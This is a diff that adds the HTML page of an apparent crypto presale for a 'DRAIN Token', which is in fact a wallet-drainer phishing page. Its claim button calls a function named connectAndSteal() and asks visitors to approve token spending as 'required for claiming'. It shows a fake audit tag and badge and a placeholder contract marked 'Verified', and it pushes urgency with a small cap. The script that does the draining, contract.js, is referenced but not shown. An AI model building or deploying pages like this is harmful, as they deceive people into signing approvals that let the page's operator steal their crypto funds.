@@ -1,0 +1,58 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DRAIN Token | Fair Launch Presale</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
+  <link rel="icon" href="assets/logo.png" type="image/png">
+  <style>
+    body { background: #0f0f0f; color: #fff; }
+    .hero { background: linear-gradient(135deg, #1a1a2e, #16213e); }
+    .card { background: #1e1e2f; border-radius: 12px; }
+    .button.is-primary { background: linear-gradient(90deg, #7928CA, #FF0080); }
+  </style>
+</head>
+<body>
+
+<section class="hero is-fullheight">
+  <div class="hero-head has-text-centered" style="padding: 20px;">
+    <img src="assets/logo.png" alt="DrainerCoin" width="80" />
+    <h1 class="title has-text-white mt-3">DRAIN Token</h1>
+    <p class="subtitle has-text-grey">Fair Launch • LP Burned • Zero Tax</p>
+    <div class="tags has-addons">
+      <span class="tag is-success">AUDITED</span>
+      <img src="assets/certik-badge.png" width="60" style="margin-left: 10px;" />
+    </div>
+  </div>
+
+  <div class="hero-body">
+    <div class="container has-text-centered">
+      <div class="box" style="max-width: 500px; margin: 0 auto;">
+        <p><strong>Contract:</strong> <code>0x123...Def456 (Verified)</code></p>
+        <p class="mt-3">Join the presale now! Only 200 BNB cap.</p>
+        <div id="metamask-area" class="mt-5">
+          <button class="button is-primary is-large" onclick="connectAndSteal()">
+            🔐 Connect MetaMask to Claim
+          </button>
+          <p class="help mt-3">You’ll be asked to Approve DRAIN first (required for claiming)</p>
+        </div>
+        <div id="success" style="display:none; margin-top: 20px;">
+          <p class="has-text-success">✅ Approval confirmed! Sending DRAIN...</p>
+          <progress class="progress is-small is-primary" max="100">30%</progress>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="hero-foot has-text-centered p-4">
+    <small class="has-text-grey">Secure • Decentralized • No KYC</small>
+  </div>
+</section>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+<script src="contract.js"></script>
+
+</body>
+</html>
